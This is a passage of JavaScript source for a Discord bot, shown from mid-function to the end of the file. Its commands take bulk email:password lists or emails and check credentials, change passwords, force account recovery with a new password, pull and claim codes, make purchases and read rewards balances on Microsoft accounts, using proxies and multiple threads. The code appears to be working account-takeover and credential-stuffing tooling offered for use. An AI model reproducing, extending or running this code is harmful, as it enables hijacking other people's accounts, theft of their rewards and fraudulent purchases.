    const lines = await fetchAttachmentLines(emailsFile);
    emails = emails.concat(
      lines
        .map((l) => l.trim().toLowerCase())
        .map((l) => (l.includes(":") ? l.split(":")[0].trim() : l))
        .filter((l) => l.includes("@") && !l.includes(" "))
    );
  }

  emails = [...new Set(emails)];

  if (emails.length === 0) {
    return respond({ embeds: [errorEmbed("No emails provided. Provide email(s) or attach a `.txt` file.")] });
  }

  // Single email — original interactive flow (supports CAPTCHA)
  if (emails.length === 1) {
    const email = emails[0];
    await respond({ embeds: [recoverProgressEmbed(email, "Initiating recovery...")] });

    const result = await initiateRecovery(email);

    if (!result.success) {
      return respond({ embeds: [recoverResultEmbed(email, false, result.error)] });
    }

    if (result.phase === "password_reset") {
      const pwResult = await submitNewPassword(result, newPassword);
      statsManager.record(userId, "recover", !!pwResult.success);
      return respond({ embeds: [recoverResultEmbed(email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
    }

    if (result.phase === "captcha_required") {
      activeRecoverySessions.set(userId, { ...result, newPassword });
      const captchaType = result.captchaInfo.type || "unknown";
      let captchaMsg = `CAPTCHA required (type: \`${captchaType}\`).\n\n`;
      if (result.captchaInfo.type === "hip" && result.captchaInfo.imageUrl) {
        const imgBuffer = await downloadCaptchaImage(result.captchaInfo.imageUrl, result.cookieJar);
        if (imgBuffer) {
          const { AttachmentBuilder } = require("discord.js");
          const att = new AttachmentBuilder(imgBuffer, { name: "captcha.png" });
          captchaMsg += "Solve the CAPTCHA below and reply with:\n`/captcha <solution>`\nor `.captcha <solution>`";
          return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)], files: [att] });
        }
      }
      if (result.captchaInfo.type === "funcaptcha") {
        captchaMsg += `FunCaptcha site key: \`${result.captchaInfo.siteKey || "N/A"}\`\nPage URL: \`${result.pageUrl}\`\n\n`;
        captchaMsg += "Solve externally, then: `/captcha <token>`";
      } else {
        captchaMsg += "Solve externally, then: `/captcha <solution>`";
      }
      return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)] });
    }

    if (result.phase === "verify_identity") {
      const options = result.verifyInfo.options.map((o) => `\`${o.index}\`: ${o.label}`).join("\n");
      return respond({ embeds: [recoverProgressEmbed(email, `Identity verification required.\n\nOptions:\n${options}\n\nNot yet automated.`)] });
    }

    return respond({ embeds: [recoverResultEmbed(email, false, `Unexpected phase: ${result.phase}`)] });
  }

  // Bulk mode
  const concurrency = Math.min(threads || 1, 10);
  const msg = await respond({ embeds: [recoverProgressEmbed(`${emails.length} emails`, `Starting bulk recovery (${concurrency} threads)...`)] });
  const editMsg = (opts) => { try { if (msg?.edit) msg.edit(opts); else respond(opts); } catch {} };

  const results = [];
  let completed = 0;

  // Process in batches
  for (let i = 0; i < emails.length; i += concurrency) {
    const batch = emails.slice(i, i + concurrency);
    const batchResults = await Promise.all(
      batch.map(email => recoverSingleEmail(email, newPassword, userId))
    );
    results.push(...batchResults);
    completed += batch.length;

    // Update progress
    const pct = Math.round((completed / emails.length) * 100);
    const success = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success && !r.skipped).length;
    const skipped = results.filter(r => r.skipped).length;
    editMsg({ embeds: [recoverProgressEmbed(
      `${emails.length} emails`,
      `Progress: ${completed}/${emails.length} (${pct}%)\nSuccess: ${success} | Failed: ${failed} | Skipped (CAPTCHA): ${skipped}`
    )] });
  }

  // Build final results
  const success = results.filter(r => r.success);
  const failed = results.filter(r => !r.success && !r.skipped);
  const skipped = results.filter(r => r.skipped);

  const files = [];
  if (success.length > 0)
    files.push(textAttachment(success.map(r => `${r.email} | ${r.message || "OK"}`), "recovered.txt"));
  if (failed.length > 0)
    files.push(textAttachment(failed.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));
  if (skipped.length > 0)
    files.push(textAttachment(skipped.map(r => `${r.email} | ${r.error}`), "skipped.txt"));

  const embed = recoverResultEmbed(
    `${emails.length} emails`,
    success.length > 0,
    `Recovered: ${success.length} | Failed: ${failed.length} | Skipped: ${skipped.length}`
  );

  const finalOpts = { embeds: [embed], files };
  editMsg(finalOpts);

  if (dmUser) {
    try { await dmUser.send(finalOpts); } catch {}
  }
}

async function handleCaptchaSolve(respond, userId, solution) {
  const session = activeRecoverySessions.get(userId);
  if (!session) {
    return respond({ embeds: [errorEmbed("No active recovery session. Start one with `/recover` first.")] });
  }

  await respond({ embeds: [recoverProgressEmbed(session.email, "Submitting CAPTCHA solution...")] });

  const result = await submitCaptchaAndContinue(session, solution);

  if (!result.success) {
    activeRecoverySessions.delete(userId);
    return respond({ embeds: [recoverResultEmbed(session.email, false, result.error)] });
  }

  if (result.phase === "password_reset") {
    const pwResult = await submitNewPassword(result, session.newPassword);
    activeRecoverySessions.delete(userId);
    statsManager.record(userId, "recover", !!pwResult.success);
    return respond({ embeds: [recoverResultEmbed(session.email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
  }

  if (result.phase === "captcha_required") {
    // Another CAPTCHA — update session
    activeRecoverySessions.set(userId, { ...result, email: session.email, newPassword: session.newPassword });
    return respond({ embeds: [recoverProgressEmbed(session.email, "Another CAPTCHA required. Solve and reply with `/captcha <solution>` again.")] });
  }

  activeRecoverySessions.delete(userId);
  return respond({ embeds: [recoverResultEmbed(session.email, false, `Unexpected result (phase: ${result.phase})`)] });
}

// ── Rewards handler ─────────────────────────────────────────

async function handleRewards(respond, userId, accountsRaw, accountsFile, threads = 3, dmUser = null) {
  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });

  const acquire = limiter.acquire(userId, "rewards");
  if (!acquire.ok) {
    const reason = acquire.reason === "busy"
      ? "You already have a command running. Wait for it to finish."
      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
    return respond({ embeds: [errorEmbed(reason)] });
  }

  const ac = new AbortController();
  activeAborts.set(userId, ac);

  try {
    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
    if (accountsFile) {
      const lines = await fetchAttachmentLines(accountsFile);
      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
    }

    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });

    const msg = await respond({
      embeds: [progressEmbed(0, accounts.length, "Checking Rewards Balances")],
      components: [stopButton(userId)],
      fetchReply: true,
    });

    let lastUpdate = Date.now();
    const results = await checkRewardsBalances(accounts, threads, (done, total) => {
      const now = Date.now();
      if (now - lastUpdate > 2000) {
        lastUpdate = now;
        updateProgress(msg, progressEmbed(done, total, "Checking Rewards Balances"), userId);
      }
    }, ac.signal);

    const stopped = ac.signal.aborted;
    const files = [];
    const success = results.filter(r => r.success);
    const failed = results.filter(r => !r.success);

    if (success.length > 0) {
      files.push(textAttachment(
        success.map(r => `${r.email} | ${r.balance.toLocaleString()} pts | Level: ${r.levelName} | Lifetime: ${r.lifetimePoints.toLocaleString()} | Streak: ${r.streak}`),
        "rewards_balances.txt"
      ));
    }
    if (failed.length > 0) {
      files.push(textAttachment(failed.map(r => `${r.email} | ${r.error}`), "rewards_failed.txt"));
    }

    const embed = rewardsResultsEmbed(results);
    if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");

    if (dmUser) {
      try {
        await dmUser.send({ embeds: [embed], files });
        await msg.edit({ embeds: [infoEmbed("Rewards Check Complete", "Results sent to your DMs.")], components: [] });
      } catch {
        await msg.edit({ embeds: [embed], files, components: [] });
      }
    } else {
      await msg.edit({ embeds: [embed], files, components: [] });
    }
  } catch (err) {
    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
  } finally {
    activeAborts.delete(userId);
    limiter.release(userId);
  }
}

// ── Slash Commands ───────────────────────────────────────────

client.on("interactionCreate", async (interaction) => {
  // Handle stop button clicks
  if (interaction.isButton() && interaction.customId.startsWith("stop_")) {
    const targetUserId = interaction.customId.replace("stop_", "");
    if (interaction.user.id !== targetUserId && !isOwner(interaction.user.id)) {
      return interaction.reply({ content: "Only the command author can stop this.", ephemeral: true });
    }
    const ac = activeAborts.get(targetUserId);
    if (ac) {
      ac.abort();
      await interaction.reply({ embeds: [infoEmbed("Stopped", "Process is stopping. Partial results will be shown.")], ephemeral: true });
    } else {
      await interaction.reply({ content: "No active process found.", ephemeral: true });
    }
    return;
  }

  // Handle help category select menu
  if (interaction.isStringSelectMenu() && interaction.customId === "help_category") {
    const category = interaction.values[0];
    const prefix = config.PREFIX;
    await interaction.update({ embeds: [helpCategoryEmbed(category, prefix)], components: [helpSelectMenu()] });
    return;
  }

  if (!interaction.isChatInputCommand()) return;

  // Channel lock enforcement
  if (!isAllowedChannel(interaction.channelId)) {
    return interaction.reply({ embeds: [errorEmbed(`Commands are restricted to <#${config.ALLOWED_CHANNEL_ID}>.`)], ephemeral: true });
  }

  const respond = (opts) => {
    if (interaction.deferred || interaction.replied) return interaction.editReply(opts);
    return interaction.reply(opts);
  };

  const { commandName, user } = interaction;

  // Send welcome on first use (to DMs)
  await sendWelcomeIfNeeded(async (opts) => {
    try { await user.send(opts); } catch {}
  }, user.id, user.username);

  try {
    if (commandName === "check") {
      await interaction.deferReply();
      const wlids = interaction.options.getString("wlids");
      const codes = interaction.options.getString("codes");
      const codesFile = interaction.options.getAttachment("codes_file");
      const threads = interaction.options.getInteger("threads") || 10;
      await handleCheck(respond, user.id, wlids, codes, codesFile, threads, user);
    }

    else if (commandName === "claim") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const threads = interaction.options.getInteger("threads") || 5;
      await handleClaim(respond, user.id, accounts, accountsFile, threads, user);
    }

    else if (commandName === "pull") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      await handlePull(respond, user.id, accounts, accountsFile, user, user.username);
    }

    else if (commandName === "wlidset") {
      const wlids = interaction.options.getString("wlids");
      const wlidsFile = interaction.options.getAttachment("wlids_file");
      await handleWlidSet(respond, user.id, wlids, wlidsFile);
    }

    else if (commandName === "auth") {
      const target = interaction.options.getUser("user");
      const duration = interaction.options.getString("duration");
      await handleAuth(respond, user.id, target.id, duration);
    }

    else if (commandName === "deauth") {
      const target = interaction.options.getUser("user");
      await handleDeauth(respond, user.id, target.id);
    }

    else if (commandName === "authlist") {
      await handleAuthList(respond);
    }

    else if (commandName === "blacklist") {
      const target = interaction.options.getUser("user");
      const reason = interaction.options.getString("reason");
      await handleBlacklist(respond, user.id, target.id, reason);
    }

    else if (commandName === "unblacklist") {
      const target = interaction.options.getUser("user");
      await handleUnblacklist(respond, user.id, target.id);
    }

    else if (commandName === "blacklistshow") {
      await handleBlacklistShow(respond);
    }

    else if (commandName === "stats") {
      await handleStats(respond);
    }

    else if (commandName === "purchase") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const product = interaction.options.getString("product");
      await handlePurchase(respond, user.id, accounts, accountsFile, product, user);
    }

    else if (commandName === "search") {
      const query = interaction.options.getString("query");
      await handleSearch(respond, query);
    }

    else if (commandName === "changer") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const newPassword = interaction.options.getString("new_password");
      const threads = interaction.options.getInteger("threads") || 5;
      await handleChanger(respond, user.id, accounts, accountsFile, newPassword, threads, user);
    }

    else if (commandName === "checker") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const threads = interaction.options.getInteger("threads") || 5;
      await handleAccountChecker(respond, user.id, accounts, accountsFile, threads, user);
    }

    else if (commandName === "help") {
      await respond({ embeds: [helpOverviewEmbed("/")], components: [helpSelectMenu()] });
    }

    else if (commandName === "rewards") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const threads = interaction.options.getInteger("threads") || 3;
      await handleRewards(respond, user.id, accounts, accountsFile, threads, user);
    }

    else if (commandName === "recover") {
      await interaction.deferReply();
      const emailsRaw = interaction.options.getString("emails");
      const emailsFile = interaction.options.getAttachment("emails_file");
      const newPassword = interaction.options.getString("new_password");
      const threads = interaction.options.getInteger("threads") || 1;
      await handleRecover(respond, user.id, emailsRaw, emailsFile, newPassword, threads, user, interaction);
    }

    else if (commandName === "captcha") {
      await interaction.deferReply();
      const solution = interaction.options.getString("solution");
      await handleCaptchaSolve(respond, user.id, solution);
    }

    // ── Admin commands ──
    else if (commandName === "admin") {
      await handleAdminPanel(respond, user.id);
    }

    else if (commandName === "setwebhook") {
      const url = interaction.options.getString("url");
      await handleSetWebhook(respond, user.id, url);
    }

    else if (commandName === "botstats") {
      await handleBotStats(respond, user.id);
    }
  } catch (err) {
    console.error(`Slash command error [${commandName}]:`, err);
    try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
  }
});

// ── Dot Prefix Commands ──────────────────────────────────────

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(config.PREFIX)) return;

  // Channel lock enforcement
  if (!isAllowedChannel(message.channelId)) return;

  const args = message.content.slice(config.PREFIX.length).trim().split(/\s+/);
  const cmd = args.shift()?.toLowerCase();
  if (!cmd) return;

  const respond = (opts) => message.reply(opts);
  // Send welcome on first use
  await sendWelcomeIfNeeded(async (opts) => {
    try { await message.author.send(opts); } catch {}
  }, message.author.id, message.author.username);

  try {
    if (cmd === "check") {
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        const storedCount = getWlidCount();
        const storedInfo = storedCount > 0 ? `\n\n**${storedCount} WLIDs stored** — just attach codes.txt to use them.` : "\n\nNo WLIDs stored. Use `.wlidset` first or provide WLIDs inline.";
        return respond({ embeds: [infoEmbed("Usage", "`.check [wlid_tokens]` + attach codes.txt\n\nIf WLIDs are stored via `.wlidset`, just attach codes.\nResults are always sent to your DMs." + storedInfo)] });
      }
      await handleCheck(respond, message.author.id, accountsRaw, null, attachment, 10, message.author);
    }

    else if (cmd === "claim") {
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.claim <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nResults are always sent to your DMs.")] });
      }
      await handleClaim(respond, message.author.id, accountsRaw, attachment, 5, message.author);
    }

    else if (cmd === "pull") {
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.pull <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nResults are always sent to your DMs.")] });
      }
      await handlePull(respond, message.author.id, accountsRaw, attachment, message.author, message.author.username);
    }

    else if (cmd === "wlidset") {
      const wlidsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!wlidsRaw && !attachment) {
        const storedCount = getWlidCount();
        return respond({ embeds: [infoEmbed("Usage", `\`.wlidset <wlid_tokens>\` or attach a .txt file\n\nReplaces all previously stored WLIDs.\n\nCurrently stored: **${storedCount}** WLIDs`)] });
      }
      await handleWlidSet(respond, message.author.id, wlidsRaw, attachment);
    }

    else if (cmd === "auth") {
      if (args.length < 2) {
        return respond({ embeds: [infoEmbed("Usage", "`.auth <@user or user_id> <duration>`\n\nDuration examples: `1h`, `7d`, `30d`, `1mo`, `forever`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      const duration = args.slice(1).join(" ");
      await handleAuth(respond, message.author.id, targetId, duration);
    }

    else if (cmd === "deauth") {
      if (args.length < 1) {
        return respond({ embeds: [infoEmbed("Usage", "`.deauth <@user or user_id>`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      await handleDeauth(respond, message.author.id, targetId);
    }

    else if (cmd === "authlist") {
      await handleAuthList(respond);
    }

    else if (cmd === "blacklist") {
      if (args.length < 1) {
        return respond({ embeds: [infoEmbed("Usage", "`.blacklist <@user or user_id> [reason]`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      const reason = args.slice(1).join(" ") || "No reason";
      await handleBlacklist(respond, message.author.id, targetId, reason);
    }

    else if (cmd === "unblacklist") {
      if (args.length < 1) {
        return respond({ embeds: [infoEmbed("Usage", "`.unblacklist <@user or user_id>`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      await handleUnblacklist(respond, message.author.id, targetId);
    }

    else if (cmd === "blacklistshow") {
      await handleBlacklistShow(respond);
    }

    else if (cmd === "stats") {
      await handleStats(respond);
    }

    else if (cmd === "purchase") {
      const productArg = args.pop();
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!productArg && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.purchase <accounts> <product_id_or_url>`\nProvide email:password and a product ID or Microsoft Store URL.\nResults are always sent to your DMs.")] });
      }
      await handlePurchase(respond, message.author.id, accountsRaw, attachment, productArg, message.author);
    }

    else if (cmd === "search") {
      const query = args.join(" ");
      await handleSearch(respond, query);
    }

    else if (cmd === "changer") {
      const newPassword = args.pop();
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!newPassword && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.changer <accounts> <new_password>`\nProvide email:password accounts and the new password.\nResults are always sent to your DMs.")] });
      }
      await handleChanger(respond, message.author.id, accountsRaw, attachment, newPassword, 5, message.author);
    }

    else if (cmd === "checker") {
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.checker <accounts>`\nProvide email:password accounts or attach a `.txt` file.\nResults are always sent to your DMs.")] });
      }
      await handleAccountChecker(respond, message.author.id, accountsRaw, attachment, 5, message.author);
    }

    else if (cmd === "help") {
      return respond({ embeds: [helpOverviewEmbed(config.PREFIX)], components: [helpSelectMenu()] });
    }

    else if (cmd === "rewards") {
      const accountsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.rewards <accounts>`\nProvide email:password or attach a `.txt` file.\nResults are always sent to your DMs.")] });
      }
      await handleRewards(respond, message.author.id, accountsRaw, attachment, 3, message.author);
    }

    else if (cmd === "recover") {
      const newPassword = args.pop();
      const emailsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!emailsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.recover <email(s)> <new_password>`\nProvide email(s) or attach a `.txt` file.\nResults are always sent to your DMs.")] });
      }
      if (!newPassword) {
        return respond({ embeds: [errorEmbed("Provide the new password as the last argument.")] });
      }
      await handleRecover(respond, message.author.id, emailsRaw, attachment, newPassword, 1, message.author, null, message);
    }

    else if (cmd === "captcha") {
      const solution = args.join(" ");
      if (!solution) {
        return respond({ embeds: [infoEmbed("Usage", "`.captcha <solution>`\n\nSubmit the CAPTCHA solution for an active recovery session.")] });
      }
      await handleCaptchaSolve(respond, message.author.id, solution);
    }

    // ── Admin commands (prefix) ──
    else if (cmd === "admin") {
      await handleAdminPanel(respond, message.author.id);
    }

    else if (cmd === "setwebhook") {
      const url = args[0];
      if (!url) return respond({ embeds: [errorEmbed("Usage: `.setwebhook <url>`")] });
      await handleSetWebhook(respond, message.author.id, url);
    }

    else if (cmd === "botstats") {
      await handleBotStats(respond, message.author.id);
    }
  } catch (err) {
    console.error(`Prefix command error [${cmd}]:`, err);
    try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
  }
});

// ── Ready ────────────────────────────────────────────────────

client.once("ready", () => {
  console.log(`Bot online as ${client.user.tag}`);
  console.log(`Owner: ${config.OWNER_ID}`);
  console.log(`Max concurrent users: ${config.MAX_CONCURRENT_USERS}`);
  console.log(`Stored WLIDs: ${getWlidCount()}`);
  
  // Load proxies on startup
  const proxyCount = loadProxies();
  console.log(`Proxies: ${config.USE_PROXIES ? `Enabled (${proxyCount} loaded)` : "Disabled"}`);
  
  // Dynamic rich presence — cycles through stats
  const presenceMessages = [
    () => ({ name: ".gg/autizmens", type: 3 }),
    () => ({ name: `${getWlidCount()} WLIDs stored`, type: 3 }),
    () => ({ name: `${auth.getAllAuthorized().length} users authorized`, type: 3 }),
    () => ({ name: `${limiter.getActiveCount()} active sessions`, type: 3 }),
    () => {
      const s = statsManager.getSummary();
      return { name: `${s.total_processed} processed`, type: 3 };
    },
    () => ({ name: ".help | .pull | .check", type: 2 }),
  ];

  let presenceIndex = 0;
  function cyclePresence() {
    const activity = presenceMessages[presenceIndex % presenceMessages.length]();
    client.user.setPresence({
      status: "online",
      activities: [activity],
    });
    presenceIndex++;
  }

  cyclePresence();
  setInterval(cyclePresence, 15000); // cycle every 15 seconds
});

client.login(config.BOT_TOKEN);
